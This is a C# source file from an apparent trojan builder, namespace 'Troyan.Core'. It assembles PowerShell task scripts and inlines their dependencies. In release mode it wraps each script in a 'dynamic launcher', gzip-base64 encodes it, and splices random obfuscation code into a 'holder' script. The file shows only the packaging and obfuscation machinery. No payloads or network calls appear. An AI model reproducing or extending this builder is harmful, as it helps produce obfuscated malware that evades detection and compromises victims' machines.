using System.Text;

namespace Troyan.Core;

public partial class CustomBuilder
{
    public class SourceFile
    {
        public string Name { get; set; }
        public string Data { get; set; }
        public bool IsDo { get; set; }
        public bool Loaded { get; set; }

        /// <summary>Payload for program.ps1 task hashtable: release wraps each do-script in the dynamic launcher then gzip-base64; debug gzip-base64 only so CustomDecode still works at runtime.</summary>
        public string TaskTablePayload(Dictionary<string, string> renamed)
        {
            var data = Data;
            if (_builder.Mode == TroyanBuildMode.Release)
                data = _builder.GeneratePowerShellScript(data, true);
            return CustomCryptor.Encode(data);
        }

        private readonly CustomBuilder _builder;

        public SourceFile(string name, CustomBuilder builder)
        {
            Name = name;
            _builder = builder;
        }
    }

    protected virtual List<SourceFile> GetSourceFiles()
    {
        var files = Directory.GetFiles(SourceDir)
            .Select(Path.GetFileNameWithoutExtension)
            .ToArray().Except(new[] { "program", "header", "footer", "dynamic" })!
            .SortWithPriority(PriorityTasks, UnpriorityTasks)
            .ToList();
        return files.Select(a => new SourceFile(a, this)).ToList();
    }

    private Dictionary<string, SourceFile> CachedSourceFiles { get; set; } = new Dictionary<string, SourceFile>();

    private SourceFile ReadSource(string sourceFile)
    {
        if (sourceFile == "dynamic")
        {

        }
        if (CachedSourceFiles.ContainsKey(sourceFile))
        {
            return CachedSourceFiles[sourceFile];
        }
        var result = ReadSourceInternal(sourceFile);

        CachedSourceFiles.Add(sourceFile, result);
        return result;
    }

    private SourceFile ReadSourceInternal(string sourceFile)
    {
        var result = new SourceFile(sourceFile, this);
        var path = "";
        var dir = SourceDir;
        while (!File.Exists(path))
        {
            path = Path.Combine(dir, sourceFile + ".ps1");
            dir = Path.Combine(dir, "..");
        }

        var lines = File.ReadAllLines(path).ToList();

        var units = new List<SourceFile>();

        var index = 0;
        while (index < lines.Count)
        {
            var line = lines[index];
            if (line.StartsWith(". ./"))
            {
                var relativePath = line[2..].Trim();
                var filenameWithoutExt = Path.GetFileNameWithoutExtension(relativePath);
                lines.RemoveAt(index);
                var linked = ReadSource(filenameWithoutExt);
                units.Add(linked);
            }
            else if (line.Trim().StartsWith("do_"))
            {
                lines.RemoveAt(index);
            }
            else
            {
                index++;
            }
        }

        var sb = new StringBuilder();

        foreach (var unit in units)
        {
            sb.AppendLine(unit.Data);
            sb.AppendLine("");
        }

        foreach (var line in lines)
        {
            sb.AppendLine(line);
        }

        sb.AppendLine("");

        var data = sb.ToString();
        result.IsDo = data.Contains($"function do_{sourceFile}");
        if (result.IsDo)
        {
            result.Data = $"Write-Host '{sourceFile}'" + Environment.NewLine;
            result.Data += data;
            result.Data += Environment.NewLine + $"do_{sourceFile}";
            result.Data += Environment.NewLine;
            result.Data += "if ($globalDebug)";
            result.Data += "{";
            result.Data += "    Start-Sleep -Seconds 100";
            result.Data += "}";
            result.Data += Environment.NewLine;
        }
        else
        {
            result.Data = data;
        }

        if (result.IsDo)
            result.Data += Environment.NewLine + ReadSource("footer").Data;

        if (sourceFile == "holder")
        {
            if (Mode == TroyanBuildMode.Debug)
            {
                result.Data = result.Data.Replace("###dynamic", "", StringComparison.Ordinal);
                result.Data = result.Data.Replace("###random", "plain", StringComparison.Ordinal);
            }
            else
            {
                var ddata = ReadSource("dynamic").Data;
                result.Data = result.Data.Replace("###dynamic", ddata, StringComparison.Ordinal);
                result.Data = result.Data.Replace("###random", _obfuscator.RandomCode(), StringComparison.Ordinal);
            }
        }

        result.Loaded = true;

        return result;
    }
}
